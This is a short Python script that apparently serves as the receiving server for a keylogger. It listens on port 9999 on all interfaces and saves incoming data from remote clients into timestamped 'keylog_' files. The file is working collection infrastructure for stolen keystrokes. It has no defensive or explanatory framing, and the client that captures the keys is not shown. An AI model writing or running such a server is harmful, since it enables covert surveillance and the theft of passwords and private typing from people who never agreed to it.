import socket
import os
from datetime import datetime

hostname = socket.gethostname()
server_ip = socket.gethostbyname(hostname)
print(f"Server IP Address: {server_ip}")

# Create a directory to store the logs if it doesn't exist
log_dir = 'received_logs'
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

# Set up the server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 9999))  # Bind to all interfaces on port 9999
server_socket.listen(5)
print("Server listening on port 9999...")

while True:
    client_socket, addr = server_socket.accept()
    print(f"Connection from {addr} has been established.")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file_path = os.path.join(log_dir, f'keylog_{timestamp}.txt')
    
    with open(log_file_path, 'a') as log_file:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            log_file.write(data.decode('utf-8'))
    
    client_socket.close()
    print(f"Log saved to {log_file_path}")